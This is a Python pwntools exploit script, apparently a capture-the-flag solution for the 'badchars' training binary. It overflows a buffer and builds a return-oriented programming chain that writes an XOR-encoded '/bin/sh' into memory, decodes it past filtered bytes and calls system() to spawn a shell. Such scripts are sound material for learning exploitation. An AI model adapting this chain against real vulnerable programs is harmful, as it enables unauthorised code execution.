#!/usr/bin/env python2
from pwn import *

# Plan:
#
# Load encrypted string in memory
# Go over each byte and xor it
# /bin/sh now in memory
# Execute

# BAD CHARS
# 0x62 0x69 0x63 0x2f 0x20    0x66 0x6e 0x73
#    b    i    c    /  space     f    n    s

xor_r15_r14b        = 0x00400b30 # xor byte [r15], r14b; ret;
mov_r12_to_r13      = 0x00400b34 # mov qword [r13], r12; ret;
pop_rdi             = 0x00400b39 # pop rdi; ret;
pop_r12_pop_r13     = 0x00400b3b # pop r12; pop r13; ret;
pop_r14_pop_r15     = 0x00400b40 # pop r14; pop r15; ret;

usefulFunction_system   = 0x004009e8
write_data              = 0x00601070 + 0x10

key    = 0x70
string = "/bin/sh".ljust(8, '\x00')

def encrypt(string, key):
    return ''.join(map(lambda x: chr(x^key), bytearray(string)))
encrypted = encrypt(string, key)

def xor_string(string_length, base_address):
    payload = ""
    for i in range(string_length+1):
        payload += p64(pop_r14_pop_r15) 
        payload += p64(key)                 # r14
        payload += p64(base_address + i)    # r15
        payload += p64(xor_r15_r14b)        # ret

    return payload

payload  = ""
payload += 'A'*40
payload += p64(pop_r12_pop_r13)
payload += encrypted            # r12
payload += p64(write_data)      # r13
payload += p64(mov_r12_to_r13)  # ret 
payload += p64(pop_r12_pop_r13)
payload += (encrypted[3]*8)     # r12
payload += p64(0x6011eb)        # r13
payload += p64(mov_r12_to_r13)  # ret
payload += xor_string(len(encrypted), write_data)   
payload += p64(pop_rdi)
payload += p64(write_data) # rdi
payload += p64(usefulFunction_system) 

log.info("Payload:\n" + payload.encode('hex'))
log.info("Encrypted: " + encrypted)
with open('payload', 'wb') as f:
    f.write(payload)

exe  = "./badchars"
proc = process(exe)
proc.recv()
proc.sendline(payload)
proc.interactive()
